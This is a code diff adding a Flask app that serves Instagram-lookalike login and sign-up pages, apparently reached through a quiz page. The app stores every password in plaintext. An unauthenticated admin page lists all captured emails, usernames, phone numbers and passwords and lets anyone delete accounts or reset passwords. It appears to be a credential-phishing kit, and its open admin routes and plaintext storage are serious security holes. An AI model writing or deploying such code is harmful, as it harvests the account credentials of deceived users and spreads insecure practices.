@@ -1,0 +1,331 @@
+from flask import Flask, render_template_string, render_template, request, redirect, url_for, session
+import sqlite3
+import os
+
+app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-key-change-in-production")
+
+DB_PATH = "users.db"
+
+# ---------- Database Setup ----------
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    
+    c.execute("PRAGMA table_info(users)")
+    columns = [row[1] for row in c.fetchall()]
+    
+    if not columns:
+        c.execute("""
+        CREATE TABLE users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email TEXT UNIQUE NOT NULL,
+            username TEXT,
+            mobile TEXT,
+            password TEXT NOT NULL
+        )
+        """)
+    else:
+        if 'username' not in columns:
+            c.execute("ALTER TABLE users ADD COLUMN username TEXT")
+        if 'mobile' not in columns:
+            c.execute("ALTER TABLE users ADD COLUMN mobile TEXT")
+    
+    # Remove old unique indexes on username/mobile if they exist
+    c.execute("DROP INDEX IF EXISTS idx_username")
+    c.execute("DROP INDEX IF EXISTS idx_mobile")
+    
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ---------- Templates ----------
+login_page = """
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Login</title>
+<style>
+:root{--bg:#000;--box:#121212;--text:#fafafa;--border:#262626;--accent:#0095f6}
+body{background:var(--bg);color:var(--text);font-family:Arial, sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;flex-direction:column;}
+.box{background:var(--box);border:1px solid var(--border);width:350px;padding:20px 40px 18px 40px;text-align:center;border-radius:8px;}
+input{width:100%;padding:10px;margin:6px 0;border-radius:4px;border:1px solid #333;background:#121212;color:var(--text);font-size:14px;}
+button{width:100%;padding:10px;margin-top:8px;border:none;border-radius:5px;background:var(--accent);color:#fff;font-weight:700;cursor:pointer;}
+.checkbox-row{display:flex;align-items:center;gap:6px;justify-content:flex-start;margin-top:6px;}
+.checkbox-row input[type="checkbox"]{width:auto;margin:0;}
+.checkbox-row label{margin:0;cursor:pointer;}
+.small{font-size:12px;color:#9aa4ad;margin-top:8px;}
+.link{color:var(--accent);text-decoration:none;}
+.error{color:#ff6b6b;margin-top:6px}
+</style>
+</head>
+<body>
+  <div class="box">
+    <img src="{{ url_for('static', filename='insta_logo_used.png') }}" alt="Logo">
+    <form method="POST">
+      <input type="text" name="identifier" placeholder="Phone, username, or email" required>
+      <input id="pw" type="password" name="password" placeholder="Password" required>
+      <div class="checkbox-row">
+        <input id="showpw" type="checkbox" onchange="togglePw()"> <label for="showpw" style="color:#9aa4ad;font-size:13px">Show password</label>
+      </div>
+      <button type="submit">Log In</button>
+    </form>
+    {% if error %}<div class="error">{{ error }}</div>{% endif %}
+    <a class="small link" href="/forgot" style="display:block;margin-top:8px">Forgot password?</a>
+  </div>
+  <div style="width:350px;text-align:center;margin-top:12px;color:#9aa4ad">
+    Don't have an account? <a class="link" href="/register">Sign up</a> | <a class="link" href="/">Back to Quiz</a>
+  </div>
+
+<script>
+function togglePw(){
+  const pw = document.getElementById('pw');
+  pw.type = pw.type === 'password' ? 'text' : 'password';
+}
+</script>
+</body>
+</html>
+"""
+
+register_page = """
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Register</title>
+<style>
+:root{--bg:#000;--box:#121212;--text:#fafafa;--border:#262626;--accent:#0095f6}
+body{background:var(--bg);color:var(--text);font-family:Arial, sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;flex-direction:column;}
+.box{background:var(--box);border:1px solid var(--border);width:350px;padding:24px 40px;border-radius:8px;text-align:center;}
+input{width:100%;padding:10px;margin:6px 0;border-radius:4px;border:1px solid #333;background:#121212;color:var(--text)}
+button{width:100%;padding:10px;border:none;border-radius:5px;background:var(--accent);color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
+.checkbox-row{display:flex;align-items:center;gap:6px;justify-content:flex-start;margin-top:6px;}
+.checkbox-row input[type="checkbox"]{width:auto;margin:0;}
+.checkbox-row label{margin:0;cursor:pointer;}
+.error{color:#ff6b6b;margin-top:6px}
+</style>
+</head>
+<body>
+  <div class="box">
+    <img src="{{ url_for('static', filename='insta_logo_used.png') }}" alt="Logo">
+    <form method="POST">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="text" name="username" placeholder="Username" required>
+      <input type="text" name="mobile" placeholder="Mobile Number" required>
+      <input id="pw2" type="password" name="password" placeholder="Password" required>
+      <div class="checkbox-row">
+        <input id="showpw2" type="checkbox" onchange="togglePw2()"> <label for="showpw2" style="color:#9aa4ad;font-size:13px">Show password</label>
+      </div>
+      <button type="submit">Sign Up</button>
+    </form>
+    {% if error %}<div class="error">{{ error }}</div>{% endif %}
+  </div>
+  <div style="width:350px;text-align:center;margin-top:12px;color:#9aa4ad">
+    Have an account? <a class="link" href="/login">Log in</a> | <a class="link" href="/">Back to Quiz</a>
+  </div>
+
+<script>
+function togglePw2(){
+  const pw = document.getElementById('pw2');
+  pw.type = pw.type === 'password' ? 'text' : 'password';
+}
+</script>
+</body>
+</html>
+"""
+
+welcome_template = """
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Welcome</title>
+<style>body{background:#000;color:#fff;font-family:Arial;margin:0;height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#121212;padding:30px;border-radius:8px;border:1px solid #262626;width:420px;text-align:center}</style>
+</head>
+<body>
+  <div class="card">
+    <h2 style="margin:0 0 12px 0">Welcome, {{ email }}!</h2>
+    <p style="color:#9aa4ad;margin:6px 0">Password you entered (plaintext):</p>
+    <div style="background:#0f0f0f;padding:10px;border-radius:6px;color:#fff;margin-bottom:12px;border:1px solid #222;">{{ entered_pw }}</div>
+    <a href="/logout" style="color:#0095f6;text-decoration:none;font-weight:bold;">Logout</a>
+  </div>
+</body>
+</html>
+"""
+
+admin_users_template = """
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Admin Users</title>
+<style>body{background:#000;color:#fff;font-family:Arial;margin:0;padding:20px}table{width:100%;border-collapse:collapse}th,td{padding:8px;border:1px solid #333;text-align:left}thead th{background:#111}a{color:#0095f6}</style>
+</head>
+<body>
+  <h2>Saved Users (plaintext)</h2>
+  <div style="overflow:auto;">
+    <table>
+      <thead><tr><th>ID</th><th>Email</th><th>Username</th><th>Mobile</th><th>Password</th><th>Actions</th></tr></thead>
+      <tbody>
+        {% for u in users %}
+          <tr>
+            <td>{{ u[0] }}</td>
+            <td>{{ u[1] }}</td>
+            <td>{{ u[2] }}</td>
+            <td>{{ u[3] }}</td>
+            <td>{{ u[4] }}</td>
+            <td>
+              <form style="display:inline" method="post" action="{{ url_for('delete_user') }}">
+                <input type="hidden" name="id" value="{{ u[0] }}">
+                <button style="background:#b22222;color:#fff;border:none;padding:6px 8px;border-radius:4px;cursor:pointer">Delete</button>
+              </form>
+              <form style="display:inline;margin-left:8px" method="get" action="{{ url_for('set_password_form') }}">
+                <input type="hidden" name="email" value="{{ u[1] }}">
+                <button style="background:#2e8b57;color:#fff;border:none;padding:6px 8px;border-radius:4px;cursor:pointer">Set Password</button>
+              </form>
+            </td>
+          </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+  <p style="margin-top:18px"><a href="/login">Back</a></p>
+</body>
+</html>
+"""
+
+set_password_form = """
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Set Password</title>
+<style>body{background:#000;color:#fff;font-family:Arial;margin:0;padding:20px}form{background:#121212;padding:20px;border-radius:8px;border:1px solid #262626;width:420px}</style>
+</head>
+<body>
+  <h2>Set / Replace Password (plaintext)</h2>
+  <form method="post" action="{{ url_for('set_password') }}">
+    <label>Email (readonly):</label><br>
+    <input type="email" name="email" value="{{ email }}" readonly style="width:420px;padding:8px;margin:8px 0;background:#0f0f0f;color:#fff;border:1px solid #333"><br>
+    <label>New password (plaintext):</label><br>
+    <input type="text" name="new_password" style="width:420px;padding:8px;margin:8px 0"><br>
+    <button type="submit" style="padding:8px 12px;background:#0095f6;color:#fff;border:none;border-radius:6px">Update Password</button>
+  </form>
+  <p style="margin-top:12px"><a href="/admin/users">Back to users</a></p>
+</body>
+</html>
+"""
+
+# ---------- Routes ----------
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    error = None
+    if request.method == "POST":
+        identifier = request.form["identifier"].strip()
+        password = request.form["password"]
+
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("""
+            SELECT email, username, mobile, password 
+            FROM users 
+            WHERE email = ? OR username = ? OR mobile = ?
+        """, (identifier, identifier, identifier))
+        row = c.fetchone()
+
+        if row and row[3] == password:
+            session["user"] = row[0]
+            conn.close()
+            return redirect(url_for("welcome"))
+        else:
+            error = "Invalid credentials. Please try again or sign up."
+            conn.close()
+    return render_template_string(login_page, error=error)
+
+@app.route("/register", methods=["GET", "POST"])
+def register():
+    error = None
+    if request.method == "POST":
+        email = request.form["email"].strip()
+        username = request.form["username"].strip()
+        mobile = request.form["mobile"].strip()
+        password = request.form["password"]
+        
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        
+        # Only check email uniqueness
+        c.execute("SELECT email FROM users WHERE email = ?", (email,))
+        if c.fetchone():
+            error = "Email already registered."
+            conn.close()
+            return render_template_string(register_page, error=error)
+        
+        try:
+            c.execute("INSERT INTO users (email, username, mobile, password) VALUES (?, ?, ?, ?)", 
+                     (email, username, mobile, password))
+            conn.commit()
+            conn.close()
+            return redirect(url_for("login"))
+        except sqlite3.IntegrityError:
+            error = "Registration failed. Please try again."
+            conn.close()
+    return render_template_string(register_page, error=error)
+
+@app.route("/welcome")
+def welcome():
+    if "user" in session:
+        return render_template_string(welcome_template, email=session.get("user"), entered_pw=session.get("last_entered_password",""))
+    return redirect(url_for("login"))
+
+@app.route("/logout")
+def logout():
+    session.pop("user", None)
+    session.pop("last_entered_password", None)
+    return redirect(url_for("login"))
+
+@app.route("/admin/users")
+def admin_users():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, email, username, mobile, password FROM users ORDER BY id DESC")
+    users = c.fetchall()
+    conn.close()
+    return render_template_string(admin_users_template, users=users)
+
+@app.route("/admin/delete", methods=["POST"])
+def delete_user():
+    user_id = request.form.get("id")
+    if user_id:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
+        conn.commit()
+        conn.close()
+    return redirect(url_for("admin_users"))
+
+@app.route("/admin/set_password_form")
+def set_password_form():
+    email = request.args.get("email", "")
+    return render_template_string(set_password_form, email=email)
+
+@app.route("/admin/set_password", methods=["POST"])
+def set_password():
+    email = request.form.get("email", "").strip()
+    new_password = request.form.get("new_password", "")
+    if email and new_password:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("UPDATE users SET password = ? WHERE email = ?", (new_password, email))
+        conn.commit()
+        conn.close()
+    return redirect(url_for("admin_users"))
+
+@app.route("/forgot")
+def forgot():
+    return "<h3 style='color:white;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;'>Forgot password flow not implemented. Use admin to reset.</h3>"
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False)
